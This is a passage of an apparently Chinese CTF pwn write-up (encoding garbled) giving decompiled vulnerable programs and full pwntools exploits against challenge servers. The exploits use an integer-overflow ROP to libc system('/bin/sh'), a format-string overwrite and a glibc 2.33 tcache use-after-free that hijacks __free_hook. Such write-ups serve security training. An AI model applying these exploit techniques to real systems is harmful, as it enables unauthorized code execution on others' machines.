class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x08</span>) + <span class="string">&#x27;\x3c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h3><p>ä¸»è¦ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1[<span class="number">10</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+2Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+30h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+34h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+38h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"> </span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input the length of array:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)abs32(v2) &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;array is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\n\n----------------------------------------------------&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;choice:\n1.add num\n2.get sum\n3.get avg\n4.exit&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;----------------------------------------------------\n&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input your choice:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;avg = %d\n&quot;</span>, v6 / v4);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;no avg!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;array is too long!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input num&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1[v4++]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; v4 &gt; i; ++i )</span><br><span class="line">        v6 += v1[i];</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;sum = %d\n&quot;</span>, v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;exit!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼€å§‹çš„ <code>scanf</code> å¤„æœªæ£€æŸ¥è¾“å…¥ï¼Œè¯»å…¥è´Ÿæ•°å¯è‡´è´Ÿæº¢å‡ºï¼Œå†ç»“åˆå†™å…¥æ•°æ®çš„ç¬¬äºŒä¸ª <code>scanf</code>ï¼Œ å¯ä»¥è¶Šæ ˆä¸€ç›´å†™ï¼Œæœ€ååˆ©ç”¨ROPä¿®æ”¹è¿”å›åœ°å€ï¼Œç¬¬ä¸€æ¬¡ROPæ±‚libcåŸºåœ°å€ï¼Œç¬¬äºŒæ¬¡ROPå¯getshellï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28547</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">n</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;input num&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">hackme_addr = elf.sym.hackme</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;length of array:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483648&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1000</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">add(puts_plt)</span><br><span class="line">add(hackme_addr)</span><br><span class="line">add(puts_got)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;exit!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x67560</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x3cf10</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x17b9db</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;length of array:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483648&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1000</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">add(signed(system_addr))</span><br><span class="line">add(hackme_addr)</span><br><span class="line">add(signed(binsh_addr))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="dest-love"><a href="#dest-love" class="headerlink" title="dest_love"></a>dest_love</h3><p>ä¸»è¦ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What about your love to Dest0g3?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, format, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4010 == <span class="number">1314520</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I can feel your love!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your dont love Dest0g3 at all!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œéœ€è¦æ”¹å†™å€¼çš„ä¸²åœ¨bssæ®µé‡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29044</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;%12$p%10$p&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x1185</span></span><br><span class="line">stack = <span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0xd8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%&#123;&#125;c%10$hn&#x27;</span>.<span class="built_in">format</span>(stack % <span class="number">0x10000</span>))</span><br><span class="line"></span><br><span class="line">target = base + <span class="number">0x4010</span></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%&#123;&#125;c%39$hn&#x27;</span>.<span class="built_in">format</span>(target % <span class="number">0x10000</span>))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%1314520c%12$n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h3><p>ä¸»è¦ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line"></span><br><span class="line">  sub_11C5(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = read_n();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invaild Choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please tell me the index: &quot;</span>);</span><br><span class="line">  v0 = read_n();</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;unk_40C0 + v0) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;unk_40C0 + v0));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Index!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é«˜ç‰ˆæœ¬ï¼ˆ2.33ï¼‰çš„UAFæ¼æ´åˆ©ç”¨ï¼Œåœ¨tcacheé‡Œå†™å…¥__free_hookï¼Œå†å†™å…¥systemã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26427</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.33.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me its size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Please tell me its content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: \n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1e0c00</span></span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">heap_addr1 = ((u64(r.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) + <span class="number">0x380</span></span><br><span class="line"><span class="comment">#print(hex(heap_addr1))</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_hook = libc_base + libc.sym.__free_hook</span><br><span class="line"><span class="comment">#print(hex(free_hook))</span></span><br><span class="line">heap_addr2 = (((u64(r.recv(<span class="number">8</span>)) ^ heap_addr1) &lt;&lt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) + <span class="number">0x330</span></span><br><span class="line"><span class="comment">#print(hex(heap_addr2))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span> = ((heap_addr2 &gt;&gt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) ^ free_hook</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="built_in">next</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.sym.system</span><br><span class="line"><span class="comment">#print(hex(system_addr))</span></span><br><span class="line">add(<span class="number">0x40</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="emma"><a href="#emma" class="headerlink" title="emma"></a>emma</h3><p>ä¸»è¦ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read_n();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">delete</span>(a1, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">      a1 = <span class="string">&quot;Invaild Choice!&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invaild Choice!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          show(a1, 